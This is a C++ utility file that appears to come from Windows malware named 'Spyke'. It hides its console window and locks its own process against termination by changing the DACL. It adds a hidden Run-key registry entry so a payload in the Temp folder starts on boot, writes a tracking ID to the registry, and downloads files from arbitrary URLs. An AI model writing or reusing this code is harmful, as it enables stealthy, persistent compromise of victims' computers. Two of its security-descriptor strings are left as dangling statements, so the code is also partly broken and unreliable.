#include "stdafx.h"
#include "Utils.h"

void Utils::HideConsole()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

BOOL Utils::DenyAccess()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");
	TEXT("(D;OICI;GA;;;BG)");
	TEXT("(D;OICI;GA;;;AN)");
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;
	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;
	return TRUE;
}

void Utils::Autoload()
{
	// SEE HERE: GETTING TEMPORARY FOLDER PATH
	TCHAR path[MAX_PATH + 1];
	DWORD len = MAX_PATH + 1;
	GetTempPath(len, path);
	TCHAR* full_path = _tcscat(path, L"Spyke.exe");
	wstring ws(full_path);
	string Name = "Spyke", Path = string(ws.begin(), ws.end());
	// HERE Path == \\Temp\\Spyke.exe, save payload to this file

	string commandAuto = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V " + Name + " /t REG_SZ /F /D \"" + Path + "\"";
	//system(commandAuto.c_str());
	WinExec(commandAuto.c_str(), SW_HIDE);
}

void Utils::GenerateID()
{
	hash<long long> h;
	sprintf_s(ID, sizeof(ID), "%u", h(time(NULL)));
	string commandID = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /V ID /t REG_SZ /F /D \"" + string(ID) + "\"";
	//system(commandID.c_str());
	WinExec(commandID.c_str(), SW_HIDE);
}

void Utils::DownloadFile(TCHAR* url, TCHAR* dir)
{
	URLDownloadToFile(0, url, dir, 0, 0);
}

void Utils::CreateDir(TCHAR* dir)
{
	CreateDirectory(dir, NULL);
}
bool Utils::FileExists(const char* fname)
{
	return _access(fname, 0) != -1;
}